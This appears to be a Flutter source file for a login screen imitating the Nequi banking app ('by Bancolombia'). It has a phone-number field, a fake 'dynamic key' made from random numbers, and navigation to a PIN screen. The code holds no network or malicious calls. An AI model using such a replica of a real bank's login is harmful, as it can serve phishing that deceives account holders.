import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'dart:async';
import 'dart:math';

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> with TickerProviderStateMixin {
  final TextEditingController _phoneController = TextEditingController();
  bool _isLoading = false;
  String _dynamicKey = '000000';
  double _progressValue = 0.0;
  Timer? _dynamicKeyTimer;
  AnimationController? _progressAnimator;

  @override
  void initState() {
    super.initState();
    _generateNewDynamicKey();
    _startDynamicKeyTimer();
  }

  @override
  void dispose() {
    _phoneController.dispose();
    _dynamicKeyTimer?.cancel();
    _progressAnimator?.dispose();
    super.dispose();
  }

  void _generateNewDynamicKey() {
    setState(() {
      _dynamicKey = (100000 + Random().nextInt(900000)).toString();
    });
  }

  void _startDynamicKeyTimer() {
    const total = Duration(seconds: 30);
    
    _progressAnimator?.dispose();
    _progressAnimator = AnimationController(
      duration: total,
      vsync: this,
    )..addListener(() {
        setState(() {
          _progressValue = _progressAnimator!.value;
        });
      });

    _progressValue = 0.0;
    _progressAnimator!.forward();

    _dynamicKeyTimer?.cancel();
    _dynamicKeyTimer = Timer.periodic(const Duration(milliseconds: 50), (timer) {
      if (_progressAnimator!.isCompleted) {
        timer.cancel();
        _progressAnimator?.stop();
        _generateNewDynamicKey();
        _progressValue = 0.0;
        _startDynamicKeyTimer();
      }
    });
  }

  void _handleLogin() {
    String phone = _phoneController.text.trim();
    
    if (phone.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Ingresa tu número de celular')),
      );
      return;
    }
    
    if (phone.length != 10) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('El número debe tener 10 dígitos')),
      );
      return;
    }

    setState(() => _isLoading = true);
    
    Future.delayed(const Duration(seconds: 2), () {
      if (mounted) {
        setState(() => _isLoading = false);
        Navigator.pushReplacementNamed(
          context,
          '/pin',
          arguments: {'userPhone': phone},
        );
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    const backgroundColor = Color(0xFF200020);
    const customPink = Color(0xFFD80082);
    const fieldBackgroundColor = Color(0xFF4D334E);
    const prefixTextColor = Color(0xFFFFB6D1);
    const dimmedWhite = Color(0xFFCCCCCC);
    const white = Colors.white;

    return Scaffold(
      backgroundColor: backgroundColor,
      body: SafeArea(
        child: Column(
          children: [
            Padding(
              padding: const EdgeInsets.all(16.0),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Container(
                    padding: const EdgeInsets.symmetric(
                      horizontal: 12,
                      vertical: 8,
                    ),
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(4),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        CustomPaint(
                          size: const Size(20, 20),
                          painter: _RingProgressPainter(
                            progress: _progressValue,
                            strokeWidth: 3.5,
                            trackColor: white,
                            progressColor: customPink,
                          ),
                        ),
                        const SizedBox(width: 10),
                        Column(
                          mainAxisSize: MainAxisSize.min,
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            const Text(
                              'Clave dinámica',
                              style: TextStyle(
                                color: white,
                                fontSize: 11,
                                fontFamily: 'Manrope',
                                height: 1.1,
                              ),
                            ),
                            const SizedBox(height: 2),
                            Text(
                              _dynamicKey,
                              style: const TextStyle(
                                color: white,
                                fontWeight: FontWeight.bold,
                                fontSize: 16,
                                letterSpacing: 1.5,
                                fontFamily: 'Manrope',
                                height: 1.0,
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(width: 8),
                        GestureDetector(
                          onTap: () {
                            Clipboard.setData(ClipboardData(text: _dynamicKey));
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(
                                content: Text('Clave copiada'),
                                duration: Duration(seconds: 2),
                              ),
                            );
                          },
                          child: const Icon(
                            Icons.copy,
                            color: dimmedWhite,
                            size: 22,
                          ),
                        ),
                      ],
                    ),
                  ),
                  Container(
                    padding: const EdgeInsets.symmetric(
                      horizontal: 14,
                      vertical: 8,
                    ),
                    decoration: BoxDecoration(
                      border: Border.all(color: white, width: 1.0),
                      borderRadius: BorderRadius.circular(4),
                    ),
                    child: const Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(Icons.help_outline, color: white, size: 20),
                        SizedBox(width: 8),
                        Text(
                          'Ayuda',
                          style: TextStyle(
                            color: white,
                            fontSize: 14,
                            fontFamily: 'Manrope',
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),

            const Spacer(),

            const Text(
              'NEQUI',
              style: TextStyle(
                color: white,
                fontSize: 48,
                fontWeight: FontWeight.bold,
              ),
            ),

            const Spacer(),

            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              child: Container(
                height: 54,
                decoration: BoxDecoration(
                  color: fieldBackgroundColor,
                  borderRadius: BorderRadius.circular(4),
                ),
                padding: const EdgeInsets.symmetric(horizontal: 12),
                child: Row(
                  children: [
                    const Text(
                      '+57',
                      style: TextStyle(
                        color: prefixTextColor,
                        fontSize: 15,
                        fontFamily: 'Manrope',
                      ),
                    ),
                    const SizedBox(width: 8),
                    Container(
                      width: 1,
                      height: 24,
                      color: backgroundColor,
                    ),
                    const SizedBox(width: 8),
                    Expanded(
                      child: TextField(
                        controller: _phoneController,
                        style: const TextStyle(
                          color: white,
                          fontSize: 17,
                          fontFamily: 'Manrope',
                        ),
                        keyboardType: TextInputType.number,
                        inputFormatters: [
                          FilteringTextInputFormatter.digitsOnly,
                          LengthLimitingTextInputFormatter(10),
                        ],
                        decoration: const InputDecoration(
                          border: InputBorder.none,
                          hintText: 'Ingresa tu cel',
                          hintStyle: TextStyle(
                            color: dimmedWhite,
                            fontSize: 17,
                            fontFamily: 'Manrope',
                          ),
                        ),
                        onChanged: (value) => setState(() {}),
                      ),
                    ),
                  ],
                ),
              ),
            ),

            const SizedBox(height: 16),

            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              child: Row(
                children: [
                  Expanded(
                    child: GestureDetector(
                      onTap: _phoneController.text.length == 10 && !_isLoading
                          ? _handleLogin
                          : null,
                      child: Opacity(
                        opacity: _phoneController.text.length == 10 && !_isLoading
                            ? 1.0
                            : 0.5,
                        child: Container(
                          height: 46,
                          decoration: BoxDecoration(
                            color: customPink,
                            borderRadius: BorderRadius.circular(4),
                          ),
                          alignment: Alignment.center,
                          child: _isLoading
                              ? const SizedBox(
                                  width: 24,
                                  height: 24,
                                  child: CircularProgressIndicator(
                                    color: white,
                                    strokeWidth: 2,
                                  ),
                                )
                              : const Text(
                                  'Entra',
                                  style: TextStyle(
                                    color: white,
                                    fontSize: 16,
                                    fontFamily: 'Manrope',
                                    fontWeight: FontWeight.w500,
                                  ),
                                ),
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(width: 8),
                  Container(
                    width: 48,
                    height: 48,
                    decoration: BoxDecoration(
                      color: customPink,
                      borderRadius: BorderRadius.circular(4),
                    ),
                    child: const Icon(
                      Icons.attach_money,
                      color: white,
                      size: 28,
                    ),
                  ),
                ],
              ),
            ),

            const SizedBox(height: 28),

            Padding(
              padding: const EdgeInsets.only(
                left: 16,
                right: 16,
                bottom: 24,
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Row(
                    children: [
                      Icon(
                        Icons.phone_android,
                        color: white,
                        size: 24,
                      ),
                      const SizedBox(width: 8),
                      const Text(
                        '¿Cambiaste tu cel?',
                        style: TextStyle(
                          color: white,
                          fontSize: 14,
                          fontFamily: 'Manrope',
                        ),
                      ),
                    ],
                  ),
                  const Text(
                    'by Bancolombia',
                    style: TextStyle(
                      color: white,
                      fontSize: 12,
                      fontFamily: 'Manrope',
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class _RingProgressPainter extends CustomPainter {
  final double progress;
  final double strokeWidth;
  final Color trackColor;
  final Color progressColor;

  _RingProgressPainter({
    required this.progress,
    required this.strokeWidth,
    required this.trackColor,
    required this.progressColor,
  });

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..style = PaintingStyle.stroke
      ..strokeCap = StrokeCap.round
      ..strokeWidth = strokeWidth;

    final rect = Rect.fromLTWH(
      strokeWidth / 2,
      strokeWidth / 2,
      size.width - strokeWidth,
      size.height - strokeWidth,
    );

    paint.color = trackColor;
    canvas.drawArc(rect, 0, 2 * pi, false, paint);

    if (progress > 0) {
      paint.color = progressColor;
      final sweep = 2 * pi * progress;
      canvas.drawArc(rect, -pi / 2, sweep, false, paint);
    }
  }

  @override
  bool shouldRepaint(_RingProgressPainter oldDelegate) {
    return oldDelegate.progress != progress;
  }
}
